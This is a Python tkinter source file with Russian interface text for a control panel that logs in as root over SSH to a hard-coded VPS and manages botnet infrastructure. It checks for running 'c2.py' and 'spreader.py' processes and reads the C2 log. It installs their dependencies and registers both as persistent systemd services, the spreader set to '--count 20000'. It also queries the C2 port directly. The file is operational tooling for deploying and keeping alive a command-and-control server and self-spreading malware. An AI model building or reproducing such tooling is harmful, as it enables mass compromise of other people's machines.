import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading, paramiko, socket, json, time, os

class DiagnosticTab(ttk.Frame):
    def __init__(self, parent, app=None):
        super().__init__(parent)
        self.app = app
        self.vps_host = "80.249.146.202"
        self.vps_user = "root"
        self.vps_pass = None
        self.create_widgets()

    def create_widgets(self):
        btn_frame = ttk.Frame(self)
        btn_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(btn_frame, text="Диагностика VPS", command=self.run_diag).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Автоисправление VPS", command=self.run_repair).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_frame, text="Проверить порт 80", command=self.check_port).pack(side=tk.LEFT, padx=2)
        self.log = scrolledtext.ScrolledText(self, height=20, bg='white', font=('Consolas', 9))
        self.log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def _ensure_pass(self):
        if not self.vps_pass:
            self.vps_pass = tk.simpledialog.askstring("VPS пароль", f"Пароль для root@{self.vps_host}:", show='*')
        return self.vps_pass is not None

    def _ssh_exec(self, cmd):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(self.vps_host, username=self.vps_user, password=self.vps_pass, timeout=10)
        stdin, stdout, stderr = client.exec_command(cmd)
        out = stdout.read().decode(errors='replace')
        err = stderr.read().decode(errors='replace')
        client.close()
        return out, err

    def run_diag(self):
        if not self._ensure_pass(): return
        self.log.delete(1.0, tk.END)
        self.log.insert(tk.END, "[*] Запущена диагностика VPS...\n")
        def task():
            try:
                # Проверка портов
                out, err = self._ssh_exec("ss -tlnp | grep -E '80|8080'")
                self.log.insert(tk.END, "--- Порты ---\n" + out + ("\n" if out else "порты не найдены\n"))
                # Процессы
                out, err = self._ssh_exec("ps aux | grep -E 'c2.py|spreader.py' | grep -v grep")
                self.log.insert(tk.END, "--- Процессы ---\n" + (out if out else "нет процессов\n"))
                # Зависимости
                deps = ['aiohttp','paramiko','redis','docker','asyncssh']
                for dep in deps:
                    out, _ = self._ssh_exec(f"python3 -c 'import {dep}' 2>&1")
                    self.log.insert(tk.END, f"{dep}: {'OK' if 'not found' not in out else 'НЕТ'}\n")
                # Лог C2
                out, _ = self._ssh_exec("cat /root/c2/c2.log 2>/dev/null | tail -10")
                self.log.insert(tk.END, "--- Последние строки C2.log ---\n" + (out if out else "файл пуст или отсутствует\n"))
            except Exception as e:
                self.log.insert(tk.END, f"[!] Ошибка: {e}\n")
            self.log.see(tk.END)
        threading.Thread(target=task, daemon=True).start()

    def run_repair(self):
        if not self._ensure_pass(): return
        self.log.delete(1.0, tk.END)
        self.log.insert(tk.END, "[*] Запущено автоисправление VPS...\n")
        def task():
            try:
                # Установка недостающих пакетов
                self.log.insert(tk.END, "[*] Установка зависимостей...\n")
                cmds = [
                    "apt update -y",
                    "pip3 install aiohttp paramiko redis docker asyncssh",
                ]
                for cmd in cmds:
                    out, err = self._ssh_exec(cmd)
                    self.log.insert(tk.END, out + err)

                # Остановка старых screen и процессов
                self.log.insert(tk.END, "[*] Остановка старых процессов...\n")
                self._ssh_exec("pkill -9 -f c2.py; pkill -9 -f spreader.py; screen -ls | awk '/\./{print $1}' | xargs -I{} screen -S {} -X quit 2>/dev/null")

                # Настройка systemd сервисов
                self.log.insert(tk.END, "[*] Настройка systemd сервисов...\n")
                unit_c2 = """[Unit]
Description=AVZ C2 Server
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 /root/c2/botnet/c2.py
Restart=always
[Install]
WantedBy=multi-user.target
"""
                unit_spreader = """[Unit]
Description=AVZ Spreader
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 -u /root/c2/botnet/spreader.py --count 20000
Restart=always
[Install]
WantedBy=multi-user.target
"""
                # Пишем unit-файлы
                self._ssh_exec(f"echo '{unit_c2}' > /etc/systemd/system/avz-c2.service")
                self._ssh_exec(f"echo '{unit_spreader}' > /etc/systemd/system/avz-spreader.service")
                # Применяем
                self._ssh_exec("systemctl daemon-reload")
                self._ssh_exec("systemctl enable avz-c2 avz-spreader")
                self._ssh_exec("systemctl restart avz-c2 avz-spreader")

                # Проверка статуса
                out, _ = self._ssh_exec("systemctl status avz-c2 avz-spreader --no-pager")
                self.log.insert(tk.END, "--- Статус сервисов ---\n" + out)
            except Exception as e:
                self.log.insert(tk.END, f"[!] Ошибка: {e}\n")
            self.log.see(tk.END)
        threading.Thread(target=task, daemon=True).start()

    def check_port(self):
        self.log.delete(1.0, tk.END)
        self.log.insert(tk.END, "[*] Проверка порта 80...\n")
        def task():
            try:
                s = socket.socket()
                s.settimeout(5)
                s.connect((self.vps_host, 80))
                s.sendall(b"list")
                data = s.recv(1024)
                s.close()
                if data:
                    self.log.insert(tk.END, f"[+] Порт 80 доступен, ответ {len(data)} байт\n")
                else:
                    self.log.insert(tk.END, "[!] Порт 80 не ответил\n")
            except Exception as e:
                self.log.insert(tk.END, f"[!] Ошибка: {e}\n")
            self.log.see(tk.END)
        threading.Thread(target=task, daemon=True).start()
